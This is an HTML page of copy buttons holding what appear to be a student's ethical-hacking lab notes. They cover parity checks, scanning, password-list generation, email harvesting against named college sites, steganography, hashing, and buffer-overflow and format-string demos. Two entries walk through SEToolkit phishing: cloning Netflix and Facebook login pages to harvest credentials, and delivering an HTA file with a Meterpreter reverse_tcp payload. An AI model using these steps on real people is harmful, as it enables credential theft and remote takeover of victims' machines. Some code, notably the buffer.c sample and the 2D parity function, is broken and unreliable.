<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Copy Text Buttons</title>
    <style>
        button {
            margin: 5px;
        }

        body {
            background-color: #f0f0f0;
            /* Light gray background */
            font-family: Arial, sans-serif;
            text-align: center;
        }

        button {
            margin: 10px;
            padding: 10px;
            font-size: 16px;
            background-color: #ddd;
            /* Light gray button background */
            border: 1px solid #aaa;
            /* Dark gray border */
            cursor: pointer;
        }

        button:hover {
            background-color: #ccc;
            /* Slightly darker background on hover */
        }
    </style>
</head>

<body>

    <button onclick="copyText(text1)">1D simple parity-check</button>
    <button onclick=" copyText(text2)">2D Double Parity</button>
    <button onclick="copyText(text3)">Remotely Accessing Kali Terminal using Putty</button>
    <button onclick="copyText(text4)">Mac Address: Advance IP Scanner</button>
    <button onclick="copyText(text5)">Netdiscover & CUPP</button>
    <button onclick="copyText(text6)">Netcraft</button>
    <button onclick="copyText(text7)">Implementing Scanning Tools</button>
    <button onclick="copyText(text8)">Credential harvester attack method</button>
    <button onclick="copyText(text9)">Infoga</button>
    <button onclick="copyText(text10)">Implement Steganography snow stool</button>
    <button onclick="copyText(text11)">Implementing Hash Salting</button>
    <button onclick="copyText(text12)">Buffer Overflow</button>
    <button onclick="copyText(text13)">Format String Attacks </button>
    <button onclick="copyText(text14)">Client-Side Attack Method</button>
    <button onclick="copyText(text15)">Basic Command</button>


    <p id="copiedMsg"></p>
    <script>
        var text1 = `
        # Pract 1: 1D simple parity-check

        # initialize a sequence
        seq = [1,0,1,0,1,0]
        
        # sum of initialized sequence
        sum_seq = sum(seq)
        
        # calculated parity bit ---> 1 (since the sum is odd)
        pari_bit = 0 if sum_seq % 2 == 0 else 1
        
        # sequence with added parity bit ---> [1,0,1,0,1,0,1]
        bin_pari = seq + [pari_bit]
        
        # print the original sequence ---> [1,0,1,0,1,0]
        print("Original Sequence:",''.join(map(str,seq)))
        print("Sequence with parity:",''.join(map(str,bin_pari)))
        
        # modify sequence at index 2
        bin_pari[2] = 0    # shows data corrupted
        
        # retrive re-calculated parity bit ---> 1 (unchanged)
        # calculate the last parity bit (element) of a list
        rec_pari = bin_pari[-1]
        
        # retrive remaining data ---> [1,0,1,0,1,0] (unchanged)
        rec_data = bin_pari[:-1]
        
        # calculate remaining sum of data --> rec_sum = 3
        rec_sum = sum(rec_data)
        
        # check data intigrity
        if rec_sum % 2 == rec_pari:
            print("Data integrity matches/intact")
        else:
            print("Data Corrupted!")
    `;
        var text2 = `
        # Practical-2: 2D Double Parity
        def add_par(data):
            for row in data:
                row.append(row.count(1)%2)
        
                column_parity=[sum(column)%2 for column in zip(*data)]
                data.append(column_parity)
                return data
        
        def check_parity(data):
            row_parity = [row[-1] for row in data[:-1]]
            calculated_row_par = [row.count(1)%2 for row in data[:-1]]
            
            column_parity = [data[-1]]
            calculated_column_par = [column.count(1)%2 for column in data[:-1]]
        
            row_error = [i for i,(actual, calculated) in enumerate
                     (zip (row_parity, calculated_row_par)) if actual != calculated]
        
            column_error = [i for i,(actual, calculated) in enumerate
                     (zip (column_parity, calculated_column_par)) if actual != calculated]
            return row_error,column_error
        
        data = [[1,0,1,0,1],[0,1,0,1,0]]
        data_par = add_par(data)
        
        print("DATA WITH PARITY BITS:")
        
        for row in data_par:
            print(row)
        
        data_par[1][1] = 0
        row_error,column_error = check_parity(data_par)
        
        print("\n DETECTED ERROR!:")
        print("ROW ERROR:",row_error)
        print("COLUMN ERROR:",column_error)
`;

        var text3 = `
        #Ip address: Putty
        #Remotely Accessing Kali Terminal using Putty
        
        #check ip address should be same
        ifconfig  --rootkali
        ipconfig  --cmdpromt
        
        #create a folder to access remotely (root kali)
        cd /home
        mkdir /testfile
        cd testfile/
        
        #Now we'll create a text file in the folder that we've created. Once created we can insert any text in that file.
        cat > xyz.txt
        Heyy Teddy!
        
        #Now we'll be checking the upgradable packages and upgrading necessary dependencies
        apt update
        
        #We will install the Open SSh server in our kali to get capability to remotely access the terminal
        apt install openssh-server
        
        #Install ufw for security creating rules for network and check the status where it'll show us the availability of the firewall and the rules applied.
        apt install ufw
        ufw status
        ufw enable
        
        #Let's add rule on our firewall by using “ufw allow 22/tcp”. The port (22) is used for Secure Shell (SSH) communication and allows remote administration access to the VM
        ufw allow 22/tcp
        
        #Now we'll start the server so that we can remotely access the terminal and check the status if the server is up and running
        service ssh start
        service ssh status
        
        #Now we'll start putty and provide IP address of our kali machine and the port i.e 22 ,connection type will SSH and select telnet.
        
        #After it is connected, we'll be prompted to enter the kali credentials to access the terminal
        login as : kali
        password(email)password:
        
        #After Logging in We can access the terminal and access the file which we have created
        cd /home
        ls
        cd testfile/
        ls
        cat xyz.text
        (Message will be visibe as Heyy Teddy!)
`;

        var text4 = `
        #Mac Address: Advance IP Scanner
        #Using the tools for scanning network and determining IP and MAC
        
        #Open Advanced IP Scanner
        #Write the IP address range and press enter
        (eg..192.168.0.0 - 192.168.0.254)
        #Sow all the host connected in that IP network range
`;

        var text5 = `
        #Netdiscover & CUPP

        #The netdiscover is a tool which is used to gather all the important information about the network. It gathers information about the connected clients and the router.
        netdiscover -r(eg-192.168.0.103)
        
        #CUPP
        #Create a folder where you want to clone the cupp repository.
        #Note: Make Sure You have Python Installed on your System, as this is a python-based tool.
        cd /home
        mkdir CUPP  --cd {folder_name}
        cd CUPP   --mkdir {folder_Name}
        git clone https://github.com/Mebus/cupp.git
        
        #After cloning we can start working with cupp and we have a few options to explore cupp to find what those options are we'll be using python3 cupp.py -h
        
        #Now we'll Start the cupp and Enter Required data for it to find the possible password.
        We'll be using “python3 cupp.py -i” to interact with cupp.
        python3 cupp.py -i
        
        #Leet mode: Leet (or "1337") is a system of modified spellings used primarily on the Internet. 
        #Hyperspeed print: Hyperspeed print means CUPP will print the generated dictionary on the console.
        
        #Let's check the file that's been created by cupp.
        ls
        apt install leafpad
        leafpad (eg-name.txt)
        `;

        var text6 = `
        #Netcraft

        #Netcraft's automated detection operates around the clock to identify malicious websites as well as fraudulent domains, social media profiles, email campaigns and more.
        
        #Enter the site url to get the report on that site.
        eg--https://kccollege.edu.in/
        `;

        var text7 = `
        #Implementing Scanning Tool
        #scan a website/ip addess to find vulnerabilities.
        
        #Zenmap
        
        #Enter the URL/Ip in Target, “nmap -T4 -A -v” is an Nmap command for intense scan after entering these two clicks scan.
        Enter--Target: eg-www.google.com
        click on - scan
        
        #click on
        Ports/Host
        
        #click on
        Topology
        
        #click on
        Host details
        `;

        var text8 = `
        #Implement Information/Email Harvesting
        #Harvesting Credentials with SEToolkit using Credential harvester attack method. 
        
        #THE SOCIAL-ENGINEER TOOLKIT (SET)
        
        #rootkali
        setoolkit
        
        #Enter 1 select 
        “Social-Engineering Attacks”.
        
        #Enter 2 select 
        “Website Attack Vectors”.
        
        #Enter 3 select 
        “Credential Harvester Attack Method”.
        
        #Enter 2 select 
        “Site Cloner”.
        
        #Click Enter When prompt is shown.
        
        #Enter The Site Url to clone
        eg--https://www.netflix.com/in/Login
        
        #Site Cloning complete prompt.
        
        #Enter the Ip Address in the browser then enter the credentials.
        
        #There should be log created in root terminal.
        
        #Hit Ctrl + C to End hosting and create a report in /root/.set/reports/{log time}.xml
        
        #Open Folder
        #Open File Explorer and look for root folder. ---enter password
        
        #Locate the report file in /root/.set/reports/ (If you can't find .set folder search it in the search bar above) Then select the file and Open with Vim.
        (you will find credentials emailid and pass)
        `;

        var text9 = `
    #Infoga
#Capture Emails available in a website using Infoga.

#Clone the repository using 
“git clone https://github.com/m4ll0k/Infoga.git” in terminal.(rootkali)

cd Infoga
ls

#Change directory to Infoga folder and install infoga using 
“python setup.py install” 

#Now run infoga with victim site url and source(search engine)
“python infoga.py -domain {URL} -source {search engine} -verbose 3” 

eg--python infoga.py -domain https://kccollege.edu.in/ -source google -verbose 3

#Note: If the source is not provided infoga will scour through some of the popular search engine.
eg--python infoga.py -domain https://hsncu.edu.in/ -verbose 3
    `;

        var text10 = `
    Implement Steganography
Perform steganography using snow tool.

#SNOW

#Create a txt file add some information into the file and saved as “test.txt” and add it into the “SNOW FOLDER”.
eg--hey
    Hellooo
    Holaaaaaa

#Encode the message "abcdefg" using the "snow.exe" tool, with passphrase "xyz," into the carrier file "test.txt," and save the result in "hidden.txt."
--in snow folder open cmd -- >SNOW.EXE -C -p 1234 -m "Twinkling Watermelon" test.txt hidden.txt

#Open the snow folder and now you can see the hidden.txt file is generated.

#The Whitespace has been added into the message
open hidden.txt to see the whitespaces

#Decode the hidden data using the following command.
--in snow folder open cmd -- >SNOW.EXE -C -p 1234 hidden.txt




#STOOL

#Perform steganography using Stool
#You can use BMP, GIF, and WAV file types to cover documents that hide secret data.

#Drag & drop the bmp file and then drop the data that you want to hide onto the bmp file. 

#Add the file you want to hide in the image. You will be prompted to Enter Passphrase and the encryption type in our case DES (Data Encryption Standard).

#Now a copy of the bmp file will create which holds the hidden data. The data can be revealed with passphrase.

#Right click on the image and a popup box will appear where you can reveal the data by entering the right “Paraphrase” and choosing the correct “Encryption Algorithm”.

#The “Hidden Data” is revealed.
`;

        var text11 = `
#Implementing Hash and Salt

#Hash

#Practical-8: Hash for password

import hashlib

def gen_hash(password):
    pass_word=password.encode('utf-8') #utf (unicode transformation format, 8 stands for 8-bits)
    hash_pass=hashlib.sha256(pass_word).hexdigest() #SHA 256 bit Algorithm- Secure Hash Algorithm
    return hash_pass

password="inevitable"
hash_pass=gen_hash(password)
print("HASHED PASSWORD FOR YOUR PASSWORD:",hash_pass)



#SALT

#Salt is a random value that is generated and combined with user's password before hashing to enhance the security of stored passwords.

import hashlib
import os

def gen_salt():
    return os.urandom(16) 

def gen_hash(password,salt):
    pass_word_salt=password.encode('utf-8')+salt #utf (unicode transformation format, 8 stands for 8-bits)
    hash_pass=hashlib.sha256(pass_word_salt).hexdigest() #SHA 256 bit Algorithm- Secure Hash Algorithm
    return hash_pass,salt

password="inevitable"
salt=gen_salt()
hash_pass,salt=gen_hash(password,salt)
print("HASHED PASSWORD FOR YOUR PASSWORD:",hash_pass)
print("SALT VALUE:",salt)
`;

        var text12 = `
#Buffer Overflow
#Understanding Buffer Overflow and Format String Attack

#Practical 9A - Buffer Overflow

#Create a file to write code with the extension "c"
nano buffer.c enter.


CODE:

#include<stdio.h>

int test_pw()

{

char pin[10];

int x = 15, 1;

printf("Enter Password:"); scanf("%s", pin); for(i = 0; i < 10; i += 2) x = (x & pin[i]) | pin [i+1]; if (x > 48)

return 0;

else

return 1;

}

#New prompt will open up “buffer.c” where we can write our code.
#To redirect to “root terminal” press cntrl+x and yes(y) enter.

#This command compiles the C source code file buffer.c using GCC. The resulting executable is named "buf" and includes debugging information (-g). Additionally, the --no-pie option is used, which means the resulting executable will not be a Position-Independent Executable

gcc -g -no-pie -o buf buffer.c

#Run the compiled file then Enter the password as it states fail which mean the password didn't meet the requirements.

./buf
(Shipra) --Fail

#In this section we can see the password is successful as it meets the length of 10 which is our requirement.
./buf
(Shiprajana) --You Win

#In this section we get segmentation fault as it overflows then the required buffer.
./buf
(Shiprajanabdhydgwefgnrnbifywurhsj)  --segmentation fault
`;

        var text13 = `
#Format String Attacks 


#Create a “string.c” file and write the code for Format String Attack example.
nano string.c enter

CODE

#include<stdio.h>

void main(int argc, char **argv)

{

printf(argv[1]);

}

#Compile the code and run the code.
gcc -o test string.c

#The program will interpret "%s" as a format specifier and try to print a string at the location pointed to by whatever value is on the stack at that moment.

./test "%s %s"

#Let's try this in Python. Create a python file “str.py” and write the following code to replicate Format String Attack. 

nano str.py

CODE

import sys
import subprocess

a = "./test"

b = sys.argv[1]

subprocess.run([a,b])


#As we can observe the output it points to the current position of the data in the stack.

python str.py "Teddy"
python str.py "%s"
python str.py "%c %p"
`;

        var text14 = `
#Client-Side Attack Method

#Type 
“setoolkit” and enter.

#Select 1 
“Social engineering Attacks”.

#Select 2 
“Website Attack Vectors”.

#Select 7 
“HTA Attack Method”.

#Select 2 
“Site Cloner”.

#Enter The URL.
https://www.facebook.com/Login/

#After this it will ask you for an ip address (put your kali linux machine ip address) to Host the clone site on that ip address.

#Enter Port Numbers to let Users Access the site e.g., 
444,1235,443 (any 1)

#Select Meterpreter Reverse TCP i.e., 
payload number 3.

#Enter 
set payload windows/meterpreter/reverse_tcp
set LHOST ---(ip address)
set LPORT 1235
set ExitOnSession false
set EnableStageEncoding true
exploit -j

#Enter the IP address in your xbrowser. The .hta file will be downloaded automatically.

#Login in into your “GMAIL” account .

#Compose a new mail and add the “Launcher.hta” file.

#After adding the file “Virus detected!”.
`;

        var text15 = `
Whoami
ifconfig
(networking )
`;

function copyText(text) {
            navigator.clipboard.writeText(text).then(function () {
                document.getElementById('copiedMsg').innerHTML = "Text Copied"
            }).catch(function (err) {
                console.error('Unable to copy text', err);
            });
        }
    </script>

</body>

</html>
